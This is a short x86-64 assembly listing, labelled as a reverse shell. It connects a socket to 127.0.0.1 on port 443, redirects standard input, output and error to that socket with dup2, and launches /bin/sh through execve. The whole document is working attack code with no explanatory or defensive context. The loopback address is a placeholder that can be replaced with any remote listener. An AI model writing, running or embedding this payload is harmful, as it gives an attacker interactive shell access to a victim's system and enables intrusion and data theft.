; reverse shell assembly

.LC0:
        .string "127.0.0.1" ; ipv4
.LC1:
        .string "/bin/sh"
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 48
        mov     DWORD PTR [rbp-36], edi
        mov     QWORD PTR [rbp-48], rsi
        mov     WORD PTR [rbp-32], 2
        mov     edi, OFFSET FLAT:.LC0
        call    inet_addr
        mov     DWORD PTR [rbp-28], eax
        mov     edi, 443
        call    htons
        mov     WORD PTR [rbp-30], ax
        mov     edx, 0
        mov     esi, 1
        mov     edi, 2
        call    socket
        mov     DWORD PTR [rbp-4], eax
        lea     rcx, [rbp-32]
        mov     eax, DWORD PTR [rbp-4]
        mov     edx, 16
        mov     rsi, rcx
        mov     edi, eax
        call    connect
        mov     eax, DWORD PTR [rbp-4]
        mov     esi, 0
        mov     edi, eax
        call    dup2
        mov     eax, DWORD PTR [rbp-4]
        mov     esi, 1
        mov     edi, eax
        call    dup2
        mov     eax, DWORD PTR [rbp-4]
        mov     esi, 2
        mov     edi, eax
        call    dup2
        mov     edx, 0
        mov     esi, 0
        mov     edi, OFFSET FLAT:.LC1
        call    execve
        mov     eax, 0
        leave
        ret